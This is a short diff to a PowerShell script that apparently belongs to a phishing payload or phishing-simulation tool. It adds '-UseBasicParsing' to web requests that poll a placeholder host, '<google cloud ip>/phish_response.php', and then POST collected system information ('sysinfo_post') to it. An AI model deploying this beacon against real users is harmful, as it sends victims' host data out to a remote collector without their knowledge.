@@ -4,7 +4,7 @@ $loop = 'true'
 
 try
 {
-    $Response = Invoke-WebRequest -Uri "http://<google cloud ip>/phish_response.php"
+    $Response = Invoke-WebRequest -Uri "http://<google cloud ip>/phish_response.php" -UseBasicParsing
     # This will only execute if the Invoke-WebRequest is successful.
     $StatusCode = $Response.StatusCode
 }
@@ -23,7 +23,7 @@ while(($StatusCode) -ne '200'){
 
     try
 {
-    $Response = Invoke-WebRequest -Uri "http://<google cloud ip>/phish_response.php"
+    $Response = Invoke-WebRequest -Uri "http://<google cloud ip>/phish_response.php" -UseBasicParsing
     # This will only execute if the Invoke-WebRequest is successful.
     $StatusCode = $Response.StatusCode
 }
@@ -61,5 +61,5 @@ $Body = @{
     sysinfo_post = $sysinfo;
 }
 
-Invoke-WebRequest 'http://<google cloud ip>/phish_response.php' -Body $Body -Method 'POST'
+Invoke-WebRequest 'http://<google cloud ip>/phish_response.php' -Body $Body -Method 'POST' -UseBasicParsing
 $loop='false'
